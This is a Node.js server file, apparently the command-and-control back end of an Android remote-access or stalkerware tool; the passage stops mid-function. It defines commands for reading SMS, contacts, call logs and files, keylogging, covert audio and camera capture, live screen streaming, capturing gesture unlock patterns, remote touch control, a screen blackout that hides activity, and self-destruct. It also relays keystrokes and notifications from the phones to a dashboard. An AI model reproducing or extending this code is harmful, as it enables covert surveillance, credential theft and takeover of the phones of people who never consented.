// ============================================
// ACCESS CONTROL SERVER
// Android  → raw TCP  (net.Socket, port 6000)
// Dashboard → HTTP SSE (GET /api/events, persistent TCP)
//             HTTP POST (commands, ping — no WS, no queuing)
// ============================================

'use strict';

const express  = require('express');
const http     = require('http');
const net      = require('net');
const cors     = require('cors');
const path     = require('path');
const fs       = require('fs');
const crypto   = require('crypto');
const mongoose = require('mongoose');
require('dotenv').config();

// ── Redis ─────────────────────────────────────────────────────────────────────
const R = require('./redis');

// ============================================
// CONFIG
// ============================================
const TCP_PORT  = parseInt(process.env.TCP_PORT)  || 6000;
const HTTP_PORT = parseInt(process.env.PORT)       || 5000;
const PING_INTERVAL  = 15000;   // ms – how often server pings clients
const PONG_TIMEOUT   = 45000;   // ms – drop if no pong received
const CMD_TIMEOUT_MS = 30000;   // ms – command timeout

// ============================================
// RECORDINGS STORAGE
// ============================================
const RECORDINGS_DIR = path.join(__dirname, 'recordings');
if (!fs.existsSync(RECORDINGS_DIR)) fs.mkdirSync(RECORDINGS_DIR, { recursive: true });
const activeRecordings = new Map(); // deviceId → { frames:[], startTime }

// ============================================
// COMMAND REGISTRY  (all cmds from SocketManager.java)
// ============================================
const COMMANDS = {
    // General / Device
    ping:                      { category: 'system',       label: 'Ping',                  icon: '📡' },
    vibrate:                   { category: 'device',       label: 'Vibrate',               icon: '📳' },
    play_sound:                { category: 'device',       label: 'Play Sound',            icon: '🔊' },
    get_clipboard:             { category: 'data',         label: 'Get Clipboard',         icon: '📋' },
    set_clipboard:             { category: 'data',         label: 'Set Clipboard',         icon: '📋' },
    get_device_info:           { category: 'system',       label: 'Device Info',           icon: 'ℹ️'  },
    get_location:              { category: 'location',     label: 'Get Location',          icon: '📍' },
    get_installed_apps:        { category: 'data',         label: 'Installed Apps',        icon: '📦' },
    get_battery_info:          { category: 'system',       label: 'Battery Info',          icon: '🔋' },
    get_network_info:          { category: 'system',       label: 'Network Info',          icon: '🌐' },
    get_wifi_networks:         { category: 'system',       label: 'WiFi Networks',         icon: '📶' },
    get_system_info:           { category: 'system',       label: 'System Info',           icon: '💻' },
    // SMS
    get_all_sms:               { category: 'sms',          label: 'Get All SMS',           icon: '💬' },
    get_sms_from_number:       { category: 'sms',          label: 'SMS From Number',       icon: '💬' },
    send_sms:                  { category: 'sms',          label: 'Send SMS',              icon: '📤' },
    delete_sms:                { category: 'sms',          label: 'Delete SMS',            icon: '🗑️' },
    // Contacts
    get_all_contacts:          { category: 'contacts',     label: 'Get Contacts',          icon: '👥' },
    search_contacts:           { category: 'contacts',     label: 'Search Contacts',       icon: '🔍' },
    // Calls
    get_all_call_logs:         { category: 'calls',        label: 'All Call Logs',         icon: '📞' },
    get_call_logs_by_type:     { category: 'calls',        label: 'Call Logs By Type',     icon: '📞' },
    get_call_logs_from_number: { category: 'calls',        label: 'Calls From Number',     icon: '📞' },
    get_call_statistics:       { category: 'calls',        label: 'Call Statistics',       icon: '📊' },
    // Camera
    get_available_cameras:     { category: 'camera',       label: 'Available Cameras',     icon: '📷' },
    take_photo:                { category: 'camera',       label: 'Take Photo',            icon: '📷' },
    // Screenshot
    take_screenshot:           { category: 'screen',       label: 'Take Screenshot',       icon: '📸' },
    // Files
    list_files:                { category: 'files',        label: 'List Files',            icon: '📁' },
    read_file:                 { category: 'files',        label: 'Read File',             icon: '📄' },
    write_file:                { category: 'files',        label: 'Write File',            icon: '✏️'  },
    delete_file:               { category: 'files',        label: 'Delete File',           icon: '🗑️' },
    copy_file:                 { category: 'files',        label: 'Copy File',             icon: '📋' },
    move_file:                 { category: 'files',        label: 'Move File',             icon: '📦' },
    create_directory:          { category: 'files',        label: 'Create Directory',      icon: '📂' },
    get_file_info:             { category: 'files',        label: 'File Info',             icon: '📄' },
    search_files:              { category: 'files',        label: 'Search Files',          icon: '🔍' },
    // Audio
    start_recording:           { category: 'audio',        label: 'Start Recording',       icon: '🎤' },
    stop_recording:            { category: 'audio',        label: 'Stop Recording',        icon: '⏹️' },
    get_recording_status:      { category: 'audio',        label: 'Recording Status',      icon: '🎙️' },
    get_audio:                 { category: 'audio',        label: 'Get Audio',             icon: '🎵' },
    list_recordings:           { category: 'audio',        label: 'List Recordings',       icon: '🎵' },
    delete_recording:          { category: 'audio',        label: 'Delete Recording',      icon: '🗑️' },
    // Keylogs
    get_keylogs:               { category: 'keylog',       label: 'Get Keylogs',           icon: '⌨️' },
    clear_keylogs:             { category: 'keylog',       label: 'Clear Keylogs',         icon: '🧹' },
    // Notifications
    get_notifications:         { category: 'notifications',label: 'Get Notifications',     icon: '🔔' },
    get_notifications_from_app:{ category: 'notifications',label: 'Notifs From App',       icon: '🔔' },
    clear_notifications:       { category: 'notifications',label: 'Clear Notifications',   icon: '🧹' },
    // Screen Control (Accessibility)
    touch:                     { category: 'screen_ctrl',  label: 'Touch',                 icon: '👆' },
    swipe:                     { category: 'screen_ctrl',  label: 'Swipe',                 icon: '↔️' },
    press_back:                { category: 'screen_ctrl',  label: 'Press Back',            icon: '◀️' },
    press_home:                { category: 'screen_ctrl',  label: 'Press Home',            icon: '🏠' },
    press_recents:             { category: 'screen_ctrl',  label: 'Press Recents',         icon: '⬜' },
    open_notifications:        { category: 'screen_ctrl',  label: 'Open Notifications',    icon: '🔔' },
    open_quick_settings:       { category: 'screen_ctrl',  label: 'Open Quick Settings',   icon: '⚙️' },
    scroll_up:                 { category: 'screen_ctrl',  label: 'Scroll Up',             icon: '⬆️' },
    scroll_down:               { category: 'screen_ctrl',  label: 'Scroll Down',           icon: '⬇️' },
    input_text:                { category: 'screen_ctrl',  label: 'Input Text',            icon: '✏️' },
    press_enter:               { category: 'screen_ctrl',  label: 'Press Enter',           icon: '↵' },
    click_by_text:             { category: 'screen_ctrl',  label: 'Click By Text',         icon: '🔍' },
    wake_screen:               { category: 'screen_ctrl',  label: 'Wake Screen',           icon: '💡' },
    request_storage_permission:{ category: 'permissions',  label: 'Request Storage Perm',  icon: '📂' },
    screen_off:                { category: 'screen_ctrl',  label: 'Screen Off',            icon: '🌑' },
    open_task_manager:         { category: 'screen_ctrl',  label: 'Task Manager',          icon: '🗂️' },
    // Screen Reader (Accessibility)
    read_screen:               { category: 'screen_reader',label: 'Read Screen',           icon: '📺' },
    find_by_text:              { category: 'screen_reader',label: 'Find By Text',          icon: '🔍' },
    get_current_app:           { category: 'screen_reader',label: 'Current App',           icon: '📱' },
    get_clickable_elements:    { category: 'screen_reader',label: 'Clickable Elements',    icon: '👆' },
    get_input_fields:          { category: 'screen_reader',label: 'Input Fields',          icon: '✏️'  },
    // Accessibility check
    get_accessibility_status:  { category: 'system',       label: 'Accessibility Status',  icon: '♿' },
    // Streaming
    stream_start:                { category: 'streaming',   label: 'Start Stream',          icon: '📡' },
    stream_stop:                 { category: 'streaming',   label: 'Stop Stream',           icon: '⏹️' },
    // Screen Recording (saved on device)
    screen_record_start:         { category: 'streaming',   label: 'Start Screen Rec',      icon: '🔴' },
    screen_record_stop:          { category: 'streaming',   label: 'Stop Screen Rec',       icon: '⏹️' },
    screen_record_list_local:    { category: 'streaming',   label: 'List Local Recs',       icon: '🎬' },
    screen_record_delete_local:  { category: 'streaming',   label: 'Delete Local Rec',      icon: '🗑️' },
    screen_record_get_local:     { category: 'streaming',   label: 'Get Local Rec',         icon: '📥' },
    // Frame on demand
    stream_request_frame:        { category: 'streaming',   label: 'Request Frame',         icon: '📸' },
    // Screen blackout
    screen_blackout_on:          { category: 'screen_ctrl', label: 'Blackout On',           icon: '⬛' },
    screen_blackout_off:         { category: 'screen_ctrl', label: 'Blackout Off',          icon: '⬜' },
    get_blackout_status:         { category: 'screen_ctrl', label: 'Blackout Status',       icon: '⬛' },
    // Permissions / App Mode
    get_permissions:             { category: 'system',      label: 'Get Permissions',       icon: '🔐' },
    request_permission:          { category: 'system',      label: 'Request Permission',    icon: '🔑' },
    request_all_permissions:     { category: 'system',      label: 'Request All Perms',     icon: '🔑' },
    // Keylogger
    list_keylog_files:           { category: 'keylog',      label: 'List Keylog Files',     icon: '📁' },
    download_keylog_file:        { category: 'keylog',      label: 'Download Keylog File',  icon: '⬇️' },
    // App Monitor
    list_app_monitor_apps:       { category: 'app_monitor', label: 'List Monitored Apps',   icon: '📡' },
    get_app_keylogs:             { category: 'app_monitor', label: 'Get App Keylogs',       icon: '⌨️' },
    list_app_keylog_files:       { category: 'app_monitor', label: 'List App Keylog Files', icon: '📁' },
    download_app_keylog_file:    { category: 'app_monitor', label: 'Download App Keylog',   icon: '⬇️' },
    list_app_screenshots:        { category: 'app_monitor', label: 'List App Screenshots',  icon: '📷' },
    download_app_screenshot:     { category: 'app_monitor', label: 'Download App Screenshot',icon:'⬇️' },
    // App Manager
    uninstall_app:               { category: 'app_manager', label: 'Uninstall App',         icon: '🗑️' },
    force_stop_app:              { category: 'app_manager', label: 'Force Stop App',        icon: '⏹️' },
    open_app:                    { category: 'app_manager', label: 'Open App',              icon: '▶️' },
    clear_app_data:              { category: 'app_manager', label: 'Clear App Data',        icon: '🧹' },
    disable_app:                 { category: 'app_manager', label: 'Disable App',           icon: '🚫' },
    add_monitored_app:           { category: 'app_manager', label: 'Monitor App',           icon: '📡' },
    remove_monitored_app:        { category: 'app_manager', label: 'Stop Monitoring App',   icon: '📡' },
    // File Manager
    list_files:                  { category: 'files',       label: 'List Files',            icon: '📂' },
    read_file:                   { category: 'files',       label: 'Read File',             icon: '📄' },
    delete_file:                 { category: 'files',       label: 'Delete File',           icon: '🗑️' },
    // Self-destruct
    self_destruct:               { category: 'system',      label: 'Self Destruct',         icon: '💣' },
    // Gesture Pattern
    gesture_draw_pattern:        { category: 'gesture',     label: 'Draw Pattern',          icon: '🖊' },
    gesture_auto_capture_start:  { category: 'gesture',     label: 'Auto-Capture Start',    icon: '⏺' },
    gesture_auto_capture_stop:   { category: 'gesture',     label: 'Auto-Capture Stop',     icon: '⏹' },
    gesture_list:                { category: 'gesture',     label: 'List Gestures',         icon: '📋' },
    gesture_get:                 { category: 'gesture',     label: 'Get Gesture',           icon: '📄' },
    gesture_replay:              { category: 'gesture',     label: 'Replay Gesture',        icon: '▶️' },
    gesture_delete:              { category: 'gesture',     label: 'Delete Gesture',        icon: '🗑️' },
    gesture_live_start:          { category: 'gesture',     label: 'Live Stream Start',     icon: '📡' },
    gesture_live_stop:           { category: 'gesture',     label: 'Live Stream Stop',      icon: '⏹' },
    gesture_live_points:         { category: 'gesture',     label: 'Live Stream Points',    icon: '📍' },
    gesture_live_delete:         { category: 'gesture',     label: 'Live Stream Delete',    icon: '🗑️' },
    gesture_live_replay:         { category: 'gesture',     label: 'Live Stream Replay',    icon: '▶️' },
    gesture_live_list:           { category: 'gesture',     label: 'Live Stream List',      icon: '📋' },
    // Connection management
    restart_connection:          { category: 'system',      label: 'Restart Connection',    icon: '🔄' },
};

// ============================================
// MONGOOSE MODELS
// ============================================
const Device      = require('./models/Device');
const User        = require('./models/User');
const Command     = require('./models/Command');
const ActivityLog = require('./models/ActivityLog');
const Task        = require('./models/Task');

const authRoutes    = require('./routes/auth');
const devicesRoutes = require('./routes/devices');

const MONGO_URI =
    process.env.MONGODB_URI ||
    process.env.MONGODB_URL ||
    process.env.mongodb_url ||
    process.env.mongodb_uri ||
    'mongodb://localhost:27017/access-control';

const _mongoKey = process.env.MONGODB_URI ? 'MONGODB_URI'
    : process.env.MONGODB_URL             ? 'MONGODB_URL'
    : process.env.mongodb_url             ? 'mongodb_url'
    : process.env.mongodb_uri             ? 'mongodb_uri'
    : '(fallback: localhost)';
log('DB', `Connecting via env key: ${_mongoKey}, protocol: ${MONGO_URI.split('://')[0]}, host starts with: ${MONGO_URI.split('@')[1]?.split('/')[0]?.substring(0,30) || 'N/A'}`);

mongoose.connect(MONGO_URI, {
    serverSelectionTimeoutMS: 5000,
    socketTimeoutMS: 45000
}).then(async () => {
    log('DB', 'MongoDB connected');
    // Mark every device offline on startup — the in-memory TCP map is empty after
    // a restart, so any device still flagged online in the DB is a stale ghost.
    // Devices will flip back to online as soon as they re-register over TCP.
    try {
        const r = await Device.updateMany({ isOnline: true }, { isOnline: false, lastSeen: new Date() });
        if (r.modifiedCount > 0) log('DB', `Startup: marked ${r.modifiedCount} stale device(s) offline`);
    } catch (e) { log('DB', 'Startup offline-mark failed: ' + e.message, 'warn'); }
}).catch(e => log('DB', 'MongoDB unavailable: ' + e.message, 'warn'));

// ============================================
// STATE
// TCP for Android devices; SSE (HTTP) for Dashboard
// ============================================
/** @type {Map<string, net.Socket & {id:string, deviceId?:string, clientType:'android', lastPong:number, buf:string}>} */
const tcpClients = new Map();          // connId → TCP socket
/** @type {Map<string, {res: import('express').Response, token:string}>} */
const sseClients = new Map();          // clientId → { res, token }
/** @type {Map<string, string>} */
const deviceToTcp = new Map();         // deviceId → primary TCP connId
/** @type {Map<string, string>} */
const deviceToStreamTcp = new Map();   // deviceId → stream channel TCP connId
/** @type {Map<string, string>} */
const deviceToLiveTcp = new Map();     // deviceId → live channel TCP connId
/** @type {Map<string, {sseId:string, command:string, deviceId:string, timer:NodeJS.Timeout}>} */
const pendingCmds = new Map();         // commandId → pending info
/** @type {Map<string, Object>} In-memory device registry for when MongoDB is unavailable */
const inMemoryDevices = new Map();     // deviceId → device object
/** @type {Set<string>} Devices that have an active stream session */
const deviceStreamingState = new Set(); // deviceId → streaming active

// ============================================
// LOGGING HELPERS
// ============================================
function log(tag, msg, level = 'info') {
    const ts = new Date().toISOString().slice(11, 23);
    const fn = level === 'warn' ? console.warn : level === 'error' ? console.error : console.log;
    fn(`[${ts}][${tag}] ${msg}`);
}

// ============================================
// PROTOCOL HELPERS
// Both TCP and WS use the same JSON envelope:
//   { "event": "...", "data": { ... } }
// TCP: newline-terminated strings  (SocketManager.java style)
// WS:  WebSocket text frames       (same JSON, no newline needed)
// ============================================

/** Send a protocol message to a TCP (Android) client */
function tcpSend(conn, event, data) {
    if (conn && conn.writable) {
        conn.write(JSON.stringify({ event, data }) + '\n');
    }
}

/** Push a server-sent event to one specific SSE (Dashboard) client */
function sseSend(clientId, event, data) {
    const client = sseClients.get(clientId);
    if (client && !client.res.writableEnded) {
        client.res.write(`data: ${JSON.stringify({ event, data })}\n\n`);
    }
}

/** Broadcast an event to ALL connected SSE dashboard clients */
function broadcastDash(event, data) {
    for (const [id, client] of sseClients) {
        if (!client.res.writableEnded) {
            client.res.write(`data: ${JSON.stringify({ event, data })}\n\n`);
        }
    }
}

// ============================================
// SHARED MESSAGE PROCESSOR
// Both TCP and WS messages go through here
// ============================================
async function processMessage(clientId, clientType, event, data) {
    log(clientType === 'android' ? 'TCP' : 'WS',
        `← [${clientId}] ${event}`);

    // ── Events expected from Android (TCP) ──────────────────────────
    if (event === 'device:register') {
        const { deviceId, deviceInfo } = data || {};
        if (!deviceId) return;

        // If there's an existing stale primary socket for this device, close it cleanly
        // before registering the new one — prevents ghost connections from later
        // broadcasting false device:disconnected events when they eventually time out.
        const existingPrimaryId = deviceToTcp.get(deviceId);
        if (existingPrimaryId && existingPrimaryId !== clientId) {
            const stale = tcpClients.get(existingPrimaryId);
            if (stale) {
                stale.destroy();
                tcpClients.delete(existingPrimaryId);
            }
        }

        // Link this TCP connection to the deviceId
        const conn = tcpClients.get(clientId);
        if (conn) {
            conn.deviceId = deviceId;
            conn.lastPong = Date.now();
            deviceToTcp.set(deviceId, clientId);
        }

        // Always update in-memory registry
        const info = { model: deviceInfo?.model, manufacturer: deviceInfo?.manufacturer,
                       androidVersion: deviceInfo?.androidVersion, name: deviceInfo?.name,
                       screenWidth: deviceInfo?.screenWidth, screenHeight: deviceInfo?.screenHeight };
        const existing = inMemoryDevices.get(deviceId) || {};
        const deviceRecord = { ...existing, deviceId,
            deviceName: deviceInfo?.name || deviceId, deviceInfo: info,
            isOnline: true, lastSeen: new Date() };
        inMemoryDevices.set(deviceId, deviceRecord);

        // Persist to Redis
        R.saveDevice(deviceId, deviceRecord).catch(() => {});

        // Persist / update (optional MongoDB)
        try {
            let dev = await Device.findOne({ deviceId });
            if (!dev) {
                dev = new Device({ deviceId, deviceName: deviceInfo?.name || deviceId,
                                   deviceInfo: info, isOnline: true });
            } else {
                dev.isOnline  = true;
                dev.lastSeen  = new Date();
                dev.deviceInfo = { ...(dev.deviceInfo || {}), ...info };
                dev.markModified('deviceInfo');
            }
            await dev.save();
        } catch (e) { log('DB', 'save error: ' + e.message, 'warn'); }

        // Load saved tasks from MongoDB and send them to the device
        let deviceTasks = [];
        try { deviceTasks = await Task.find({ deviceId }).sort({ updatedAt: -1 }).lean(); } catch (_) {}

        // Ack back to device
        if (conn) tcpSend(conn, 'device:registered', { success: true, deviceId, tasks: deviceTasks });

        // Notify dashboards
        broadcastDash('device:connected', { deviceId, deviceInfo, timestamp: new Date() });
        broadcastDeviceList();
        return;
    }

    // ── Multi-channel registration from Android secondary sockets ────────────
    if (event === 'device:register_channel') {
        const { deviceId, channelType } = data || {};
        if (!deviceId || !channelType) return;
        const conn = tcpClients.get(clientId);
        if (conn) {
            conn.deviceId    = deviceId;
            conn.channelType = channelType;
            conn.lastPong    = Date.now();
            if (channelType === 'stream') {
                // Evict old stale stream socket before registering the new one
                const oldStreamId = deviceToStreamTcp.get(deviceId);
                if (oldStreamId && oldStreamId !== clientId) {
                    const stale = tcpClients.get(oldStreamId);
                    if (stale) { stale.destroy(); tcpClients.delete(oldStreamId); }
                }
                deviceToStreamTcp.set(deviceId, clientId);
                log('TCP', `Stream channel registered for ${deviceId}`);
                // Auto-resume streaming if device had an active stream session
                if (deviceStreamingState.has(deviceId)) {
                    const primaryId = deviceToTcp.get(deviceId);
                    const primaryConn = primaryId ? tcpClients.get(primaryId) : null;
                    if (primaryConn && primaryConn.writable) {
                        const autoCommandId = crypto.randomBytes(12).toString('hex');
                        setTimeout(() => {
                            tcpSend(primaryConn, 'command:execute', { commandId: autoCommandId, command: 'stream_start', params: null });
                            log('TCP', `Auto-resumed stream for ${deviceId} after channel reconnect [${autoCommandId}]`);
                        }, 600);
                    }
                }
            } else if (channelType === 'live') {
                // Evict old stale live socket before registering the new one
                const oldLiveId = deviceToLiveTcp.get(deviceId);
                if (oldLiveId && oldLiveId !== clientId) {
                    const stale = tcpClients.get(oldLiveId);
                    if (stale) { stale.destroy(); tcpClients.delete(oldLiveId); }
                }
                deviceToLiveTcp.set(deviceId, clientId);
                log('TCP', `Live channel registered for ${deviceId}`);
            }
        }
        return;
    }

    if (event === 'device:heartbeat') {
        const { deviceId } = data || {};
        if (!deviceId) return;
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now();
        // Update in-memory registry
        const existing = inMemoryDevices.get(deviceId);
        if (existing) inMemoryDevices.set(deviceId, { ...existing, isOnline: true, lastSeen: new Date() });
        // Broadcast to dashboards immediately, then persist async
        broadcastDash('device:heartbeat', { deviceId, timestamp: new Date() });
        R.markDeviceOnline(deviceId).catch(() => {});
        Device.findOneAndUpdate({ deviceId }, { lastSeen: new Date(), isOnline: true }).catch(() => {});
        return;
    }

    if (event === 'device:pong') {
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now();
        return;
    }

    // ── Keylog push from Android → relay to dashboards ──────────────
    if (event === 'keylog:entry') {
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now(); // keep live channel alive
        const deviceId = conn?.deviceId || data?.deviceId;
        if (deviceId) {
            const entry = { ...data, deviceId, timestamp: data.timestamp || new Date().toISOString() };
            broadcastDash('keylog:push', entry);
            // Persist to Redis (non-blocking)
            R.pushKeylog(deviceId, entry).catch(() => {});
        }
        return;
    }

    // ── Notification push from Android → relay to dashboards ─────────
    if (event === 'notification:entry') {
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now(); // keep live channel alive
        const deviceId = conn?.deviceId || data?.deviceId;
        if (deviceId) {
            const entry = { ...data, deviceId };
            // Store in memory per device (last 200)
            if (!global.deviceNotifications) global.deviceNotifications = new Map();
            const list = global.deviceNotifications.get(deviceId) || [];
            list.unshift(entry);
            if (list.length > 200) list.pop();
            global.deviceNotifications.set(deviceId, list);
            // Persist to Redis (non-blocking)
            R.pushNotification(deviceId, entry).catch(() => {});
            broadcastDash('notification:push', entry);
        }
        return;
    }

    // ── Recent app activity from Android → relay to dashboards ───────
    if (event === 'app:foreground') {
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now(); // keep live channel alive
        const deviceId = conn?.deviceId || data?.deviceId;
        if (deviceId) {
            const entry = { ...data, deviceId };
            if (!global.deviceActivity) global.deviceActivity = new Map();
            const list = global.deviceActivity.get(deviceId) || [];
            // Dedupe consecutive same-app entries
            if (!list.length || list[0].packageName !== entry.packageName) {
                list.unshift(entry);
                if (list.length > 100) list.pop();
                global.deviceActivity.set(deviceId, list);
                // Persist to Redis (non-blocking)
                R.pushActivity(deviceId, entry).catch(() => {});
                broadcastDash('activity:app_open', entry);
            }
        }
        return;
    }

    // ── Stream frame from Android ────────────────────────────────────
    if (event === 'stream:frame') {
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now(); // keep stream channel alive
        const deviceId = conn?.deviceId;
        if (!deviceId) return;
        const frameData = data?.frameData;
        if (!frameData) return;
        // Relay to all dashboard clients — include screen dimensions for coordinate mapping
        const frameMsg = { deviceId, frameData, timestamp: data.timestamp || Date.now() };
        if (data.screenWidth)  frameMsg.screenWidth  = data.screenWidth;
        if (data.screenHeight) frameMsg.screenHeight = data.screenHeight;
        broadcastDash('stream:frame', frameMsg);
        // Buffer if server-side recording is active
        const rec = activeRecordings.get(deviceId);
        if (rec) rec.frames.push({ frameData, timestamp: data.timestamp || Date.now() });
        return;
    }

    // ── Command response from Android ───────────────────────────────
    if (event === 'command:response') {
        const { commandId, response, error } = data || {};
        if (!commandId) return;

        const conn = tcpClients.get(clientId);
        const deviceId = conn?.deviceId;

        // Push to dashboard SSE IMMEDIATELY — before any DB operations
        const pending = pendingCmds.get(commandId);
        if (pending) {
            clearTimeout(pending.timer);
            pendingCmds.delete(commandId);

            const result = { commandId, command: pending.command, deviceId,
                             response, error: error || null, success: !error,
                             timestamp: new Date() };
            if (pending.sseId) sseSend(pending.sseId, 'command:result', result);

            broadcastDash('activity:log', {
                type: 'command_result', deviceId, command: pending.command,
                commandId, success: !error, timestamp: new Date()
            });
        }

        // Persist to DB fire-and-forget — never block the response pipeline on DB
        Command.findOneAndUpdate(
            { id: commandId },
            { status: error ? 'failed' : 'success', response, error, completedAt: new Date() }
        ).catch(() => {});

        return;
    }

    log('MSG', `Unhandled event: ${event}`, 'warn');
}

// ============================================
// TCP SERVER — Android devices
// ============================================
const tcpServer = net.createServer((conn) => {
    const id = crypto.randomBytes(8).toString('hex');
    conn.id          = id;
    conn.clientType  = 'android';
    conn.lastPong    = Date.now();
    conn.buf         = '';
    tcpClients.set(id, conn);
    log('TCP', `New Android connection ${id} from ${conn.remoteAddress}`);

    conn.setEncoding('utf8');

    conn.on('data', (chunk) => {
        conn.buf += chunk;
        let idx;
        while ((idx = conn.buf.indexOf('\n')) !== -1) {
            const line = conn.buf.slice(0, idx).trim();
            conn.buf = conn.buf.slice(idx + 1);
            if (!line) continue;
            let msg;
            try { msg = JSON.parse(line); } catch (e) { continue; }
            processMessage(id, 'android', msg.event, msg.data);
        }
    });

    conn.on('close', async () => {
        log('TCP', `Disconnected ${id} (device: ${conn.deviceId || 'unregistered'}, channel: ${conn.channelType || 'primary'})`);
        tcpClients.delete(id);
        if (conn.deviceId) {
            if (conn.channelType === 'stream') {
                // Only remove the stream ref if this socket is still the active one
                if (deviceToStreamTcp.get(conn.deviceId) === id) deviceToStreamTcp.delete(conn.deviceId);
            } else if (conn.channelType === 'live') {
                // Only remove the live ref if this socket is still the active one
                if (deviceToLiveTcp.get(conn.deviceId) === id) deviceToLiveTcp.delete(conn.deviceId);
            } else {
                // Primary channel closed. Only broadcast device:disconnected if this socket
                // is STILL the active primary — a new device:register may have already replaced
                // it (e.g. after our eviction), in which case the device is still online.
                if (deviceToTcp.get(conn.deviceId) !== id) {
                    log('TCP', `Stale primary closed for ${conn.deviceId} — new primary active, skipping disconnect broadcast`);
                    return;
                }
                deviceToTcp.delete(conn.deviceId);
                deviceStreamingState.delete(conn.deviceId);
                R.markDeviceOffline(conn.deviceId).catch(() => {});
                try {
                    await Device.findOneAndUpdate({ deviceId: conn.deviceId },
                        { isOnline: false, lastSeen: new Date() });
                } catch (e) {}
                broadcastDash('device:disconnected', { deviceId: conn.deviceId, timestamp: new Date() });
                broadcastDeviceList();
            }
        }
    });

    conn.on('error', (e) => log('TCP', `Error on ${id}: ${e.message}`, 'error'));
});

tcpServer.on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
        log('TCP', `Port ${TCP_PORT} in use — killing and retrying…`, 'warn');
        try { require('child_process').execSync(`fuser -k ${TCP_PORT}/tcp 2>/dev/null`); } catch (_) {}
        setTimeout(() => tcpServer.listen(TCP_PORT, '0.0.0.0'), 1500);
    } else {
        log('TCP', `Server error: ${err.message}`, 'error');
    }
});
tcpServer.listen(TCP_PORT, '0.0.0.0', () =>
    log('TCP', `Android device server listening on 0.0.0.0:${TCP_PORT}`));

// ============================================
// HTTP SERVER — Dashboard (SSE + REST, no WebSocket)
// ============================================
const app    = express();
const server = http.createServer(app);

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/api/auth', authRoutes);
app.use('/api/user', devicesRoutes);

// ── Admin login using ADMIN_USERNAME / ADMIN_PASSWORD secrets ────────────────
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body || {};
    const adminUser = (process.env.ADMIN_USERNAME || '').trim();
    const adminPass = (process.env.ADMIN_PASSWORD || '').trim();
    log('AUTH', `Admin login attempt — user="${username}" configured=${!!adminUser && !!adminPass}`);
    if (!adminUser || !adminPass) {
        log('AUTH', 'ADMIN_USERNAME/ADMIN_PASSWORD not set in environment', 'error');
        return res.status(500).json({ success: false, error: 'Admin credentials not configured on server.' });
    }
    if ((username || '').trim() === adminUser && (password || '').trim() === adminPass) {
        const token = crypto.randomBytes(32).toString('hex');
        if (!global._adminTokens) global._adminTokens = new Map();
        global._adminTokens.set(token, Date.now() + 86400000);
        log('AUTH', `Admin login successful for "${username}"`);
        return res.json({ success: true, token });
    }
    log('AUTH', `Admin login failed — credentials mismatch`, 'warn');
    return res.status(401).json({ success: false, error: 'Invalid credentials.' });
});

// ── Fast dedicated blackout channel ──────────────────────────────────────────
// Bypasses the WebSocket command queue — writes directly to the device TCP socket.
// Dashboard calls this via HTTP for minimum latency (no WS roundtrip, no queue wait).
app.post('/api/device/:deviceId/blackout', (req, res) => {
    const { deviceId } = req.params;
    const { state } = req.body; // true = on, false = off
    const command  = state ? 'screen_blackout_on' : 'screen_blackout_off';
    const tcpConnId = deviceToTcp.get(deviceId);
    const tcpConn   = tcpConnId ? tcpClients.get(tcpConnId) : null;
    if (!tcpConn || !tcpConn.writable) {
        return res.status(404).json({ success: false, error: 'Device offline or not found' });
    }
    const commandId = crypto.randomBytes(8).toString('hex');
    tcpSend(tcpConn, 'command:execute', { commandId, command, params: null });
    log('BLACKOUT', `Fast channel: ${command} → ${deviceId}`);
    res.json({ success: true, command, deviceId });
});

// ── Admin token verification ──────────────────────────────────────────────────
app.post('/api/admin/verify', (req, res) => {
    const { token } = req.body;
    if (!token) return res.status(401).json({ success: false });
    if (!global._adminTokens) return res.status(401).json({ success: false });
    const expiry = global._adminTokens.get(token);
    if (!expiry || Date.now() > expiry) {
        global._adminTokens.delete(token);
        return res.status(401).json({ success: false });
    }
    return res.json({ success: true });
});

// ── SSE event stream — Dashboard persistent TCP push channel ─────────────────
// Browser connects here with EventSource; server pushes newline-delimited JSON.
// Each dashboard has an sseId used to route command results back to the right tab.
app.get('/api/events', async (req, res) => {
    const token = req.query.token;
    if (!token || !global._adminTokens) return res.status(401).end();
    const expiry = global._adminTokens.get(token);
    if (!expiry || Date.now() > expiry) return res.status(401).end();

    const clientId = crypto.randomBytes(8).toString('hex');

    res.setHeader('Content-Type',  'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection',    'keep-alive');
    res.setHeader('X-Accel-Buffering', 'no');  // disable nginx buffering
    res.flushHeaders();

    sseClients.set(clientId, { res, token });
    log('SSE', `Dashboard connected ${clientId}`);

    // Immediately push device list + command registry
    const list = await getDeviceList();
    sseSend(clientId, 'device:list', list);
    sseSend(clientId, 'commands:registry', COMMANDS);
    // Tell the client its own sseId so it can include it in HTTP requests
    sseSend(clientId, 'session:init', { sseClientId: clientId });

    // Keep the connection alive with a comment every 25 s
    const keepAlive = setInterval(() => {
        if (!res.writableEnded) res.write(': ka\n\n');
    }, 25000);

    req.on('close', () => {
        clearInterval(keepAlive);
        sseClients.delete(clientId);
        log('SSE', `Dashboard disconnected ${clientId}`);
        for (const [cid, p] of pendingCmds) {
            if (p.sseId === clientId) { clearTimeout(p.timer); pendingCmds.delete(cid); }
        }
    });
});

// ── Dashboard ping — measure server RTT over HTTP/TCP ────────────────────────
app.post('/api/dashboard/ping', (req, res) => {
    res.json({ sentAt: req.body?.sentAt ?? null, serverAt: Date.now() });
});

// ── Recording start/stop via HTTP ─────────────────────────────────────────────
app.post('/api/recordings/:deviceId/start', (req, res) => {
    const { deviceId } = req.params;
    if (!activeRecordings.has(deviceId)) {
        activeRecordings.set(deviceId, { frames: [], startTime: Date.now() });
    }
    broadcastDash('recording:started', { deviceId });
    res.json({ success: true, deviceId });
});

app.post('/api/recordings/:deviceId/stop', (req, res) => {
    const { deviceId } = req.params;
    const rec = activeRecordings.get(deviceId);
    if (!rec) return res.status(404).json({ success: false, error: 'No active recording' });
    activeRecordings.delete(deviceId);
    try {
